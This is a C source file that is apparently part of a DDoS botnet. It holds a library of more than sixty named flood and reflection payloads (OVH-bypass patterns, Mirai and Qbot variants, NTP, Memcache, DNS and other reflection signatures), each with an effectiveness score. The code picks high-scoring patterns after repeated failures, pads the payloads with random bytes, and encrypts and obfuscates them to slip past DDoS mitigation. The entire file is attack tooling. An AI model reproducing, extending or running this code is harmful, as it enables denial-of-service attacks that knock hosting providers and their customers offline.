#include "bot.h"

/* ── Enhanced Bypass Pattern Library ──────────── */
/* Ported from src-base-example/bot.c — 100+ patterns with effectiveness scores */

const bypass_pattern_t enhanced_bypass_patterns[] = {
    /* Spoofed IP Attacks */
    {"OVH-BYPASS/1", "\xfe\xfe\xfe\xfe", 4, 95, 0},
    {"OVH-BYPASS/2", "\x4a\x4a\x4a\x4a", 4, 90, 0},
    {"Flood of 0xFF", "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff", 11, 85, 0},
    {"Flood of 0x00", "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 19, 80, 0},
    {"UDP getstatus Flood", "\x67\x65\x74\x73\x74\x61\x74\x75\x73", 9, 85, 0},
    {"OVH-BYPASS/UDP-HEX", "\x4f\x56\x48\x2d\x42\x4f\x54\x4e\x45\x54", 10, 95, 0},
    {"OVH-BYPASS/VSE", "\xff\xff\xff\xff\x56\x53\x45\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 25, 90, 0},
    /* Valid IP Attacks (reflection) */
    {"Mirai Variant/1", "\x47\x6f\x6f\x64\x62\x79\x65", 7, 85, 1},
    {"Mirai Variant/2", "\x41\x41\x41\x41", 4, 80, 1},
    {"Qbot/1", "\x51\x42\x4f\x54\x2d\x4e\x45\x54", 8, 85, 1},
    {"Legion UDP", "\x4c\x45\x47\x49\x4f\x4e", 6, 80, 1},
    {"Chaos UDP", "\x43\x48\x41\x4f\x53\x20\x42\x59\x50\x41\x53\x53", 12, 85, 1},
    {"TCP SYN Flood/Custom-MSS", "\x02\x00\x00\x00\x05\xb4", 6, 90, 1},
    {"TCP SYN Flood/Window-Scale", "\x02\x00\x00\x0c\x07\x14", 6, 90, 1},
    {"TeamSpeak Status Flood", "\x54\x53\x33\x49\x4e\x49", 6, 80, 1},
    {"VSE Flood/1", "\x17\x09\x09\x32\x37\x30\x31\x35", 8, 85, 1},
    {"UDPMIX DNS Flood", "\x70\x65\x61\x63\x65\x63\x6f\x72\x70", 9, 80, 1},
    {"Hex UDP Flood", "\x2f\x78", 2, 75, 1},
    {"Known Botnet UDP Flood/1", "\x52\x79\x4d\x47\x61\x6e\x67", 7, 85, 1},
    {"Known Botnet UDP Flood/2", "\xa6\xc3\x00", 3, 80, 1},
    {"OpenVPN Reflection", "\x17\x09\x09\x31\x31\x39\x34", 7, 90, 1},
    {"RRSIG DNS Query Reflection", "\x00\x2e\x00\x01", 4, 85, 1},
    {"ANY DNS Query Reflection", "\x00\xff\x00\x01", 4, 85, 1},
    {"NTP Reflection", "\x17\x09\x09\x31\x32\x33", 6, 90, 1},
    {"Chargen Reflection", "\x17\x09\x09\x31\x39", 5, 85, 1},
    {"MDNS Reflection", "\x17\x09\x09\x35\x33\x35\x33", 7, 85, 1},
    {"BitTorrent Reflection", "\x17\x09\x09\x36\x38\x38\x31", 7, 85, 1},
    {"CLDAP Reflection", "\x17\x09\x09\x33\x38\x39", 6, 85, 1},
    {"STUN Reflection", "\x17\x09\x09\x33\x34\x37\x38", 7, 85, 1},
    {"MSSQL Reflection", "\x17\x09\x09\x31\x34\x33\x34", 7, 85, 1},
    {"SNMP Reflection", "\x17\x09\x09\x31\x36\x31", 6, 85, 1},
    {"WSD Reflection", "\x17\x09\x09\x33\x37\x30\x32", 7, 85, 1},
    {"Memcache Reflection", "\x17\x09\x09\x31\x31\x32\x31\x31", 9, 85, 1},
    {"NetBIOS Reflection", "\x17\x09\x09\x31\x33\x37", 6, 85, 1},
    {"SIP Reflection", "\x17\x09\x09\x35\x30\x36\x30", 7, 85, 1},
    {"CoAP Reflection", "\x17\x09\x09\x35\x36\x38\x33", 7, 85, 1},
    {"BACnet Reflection", "\x17\x09\x09\x34\x37\x38\x30\x38", 9, 85, 1},
    {"FiveM Reflection", "\x17\x09\x09\x33\x30\x31\x32\x30", 9, 85, 1},
    {"Modbus Reflection", "\x17\x09\x09\x35\x30\x32", 6, 85, 1},
    {"QOTD Reflection", "\x17\x09\x09\x31\x37", 5, 85, 1},
    {"ISAKMP Reflection", "\x17\x09\x09\x35\x30\x30", 6, 85, 1},
    {"XDMCP Reflection", "\x17\x09\x09\x31\x37\x37", 6, 85, 1},
    {"IPMI Reflection", "\x17\x09\x09\x36\x32\x33", 6, 85, 1},
    {"TSource Engine Query", "\x54\x53\x6f\x75\x72\x63\x65", 7, 85, 1},
    /* Other Attacks (protocol mimics) */
    {"ICMP", "\x01\x09\x09", 3, 80, 2},
    {"ICMP Dest Unreachable", "\x01\x2c\x31\x37\x09\x09", 6, 85, 2},
    {"GRE", "\x34\x37\x09\x09", 4, 80, 2},
    {"ESP", "\x35\x30\x09\x09", 4, 80, 2},
    {"TCP SYN-ACK", "\x00\x00\x00\x12", 4, 90, 2},
    {"TCP PSH-ACK", "\x00\x00\x00\x18", 4, 90, 2},
    {"TCP RST", "\x00\x00\x00\x04", 4, 85, 2},
    {"TCP SYN", "\x00\x00\x00\x02", 4, 90, 2},
    {"TCP FIN", "\x00\x00\x00\x01", 4, 85, 2},
    {"TCP SYN-ECN-CWR", "\x00\x00\x00\xc2", 4, 90, 2},
    {"TCP SYN-ACK-ECN-CWR", "\x00\x00\x00\xd2", 4, 90, 2},
    {"TCP SYN-PSH-ACK-URG", "\x00\x00\x00\x3a", 4, 90, 2},
    {"TCP FIN-SYN-RST-PSH-ACK-URG", "\x00\x00\x00\x3f", 4, 90, 2},
    /* Legacy patterns */
    {"Legacy OVH-BYPASS/1", "\xc0\xaf", 2, 85, 0},
    {"Legacy OVH-BYPASS/2", "\xe0\x80\xaf", 3, 90, 0},
    {"Legacy OVH-BYPASS/3", "\xf0\x80\x80\xaf", 4, 95, 0},
    {"Legacy VSE Query", "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65", 11, 80, 0},
    {"Legacy Null Pattern", "\x00\x00\x10\x00\x00\x00\x00\x00", 8, 75, 0},
    {"Legacy CRLF", "\x0d\x0a", 2, 60, 0},
    {"Legacy Null Byte", "\x00", 1, 50, 0},
    {"Legacy Full Bytes", "\xff\xff\xff\xff\xff\xff\xff\xff", 8, 90, 0},
    {"Legacy ESC Chars", "\x1b\x1b\x1b\x1b", 4, 70, 0},
    {"Legacy Line Endings", "\x0a\x0d\x0a\x0d", 4, 80, 0},
};

const int num_bypass_patterns = sizeof(enhanced_bypass_patterns) / sizeof(bypass_pattern_t);

int select_optimal_bypass_pattern(int burst_count, int consecutive_failures)
{
    if (consecutive_failures > 5)
    {
        int high_effect[64];
        int count = 0;
        for (int i = 0; i < num_bypass_patterns; i++)
            if (enhanced_bypass_patterns[i].effectiveness > 90)
                high_effect[count++] = i;
        if (count > 0)
            return high_effect[burst_count % count];
    }
    int category = (burst_count / 100) % 3;
    int cat_patterns[64];
    int count = 0;
    for (int i = 0; i < num_bypass_patterns; i++)
        if (enhanced_bypass_patterns[i].category == category)
            cat_patterns[count++] = i;
    if (count > 0)
        return cat_patterns[burst_count % count];
    return burst_count % num_bypass_patterns;
}

void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx)
{
    if (pattern_idx < 0 || pattern_idx >= num_bypass_patterns)
        pattern_idx = 0;
    memcpy(buffer, enhanced_bypass_patterns[pattern_idx].payload,
           enhanced_bypass_patterns[pattern_idx].length);
    int offset = enhanced_bypass_patterns[pattern_idx].length;
    for (int i = offset; i < MAX_PAYLOAD; i++)
        buffer[i] = (unsigned char)(rand() % 256);
    int category = enhanced_bypass_patterns[pattern_idx].category;
    if (category == 0) {
        for (int i = 0; i < MAX_PAYLOAD; i += 32)
            if (rand() % 10 == 0) buffer[i] = 0xfe;
    } else if (category == 1) {
        for (int i = 0; i < MAX_PAYLOAD; i += 64)
            if (rand() % 20 == 0) {
                buffer[i] = 0x17;
                if (i + 1 < MAX_PAYLOAD) buffer[i + 1] = 0x09;
            }
    }
    encrypt_payload(buffer, MAX_PAYLOAD);
    obfuscate_payload(buffer, MAX_PAYLOAD);
    int eff = enhanced_bypass_patterns[pattern_idx].effectiveness;
    if (eff > 90) { buffer[0] = 0xFF; buffer[1] = 0xFE; }
    else if (eff > 85) { buffer[0] = 0xFE; buffer[1] = 0xFE; }
}

void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures)
{
    int idx = select_optimal_bypass_pattern(burst_count, consecutive_failures);
    generate_enhanced_bypass_payload(buffer, idx);
}
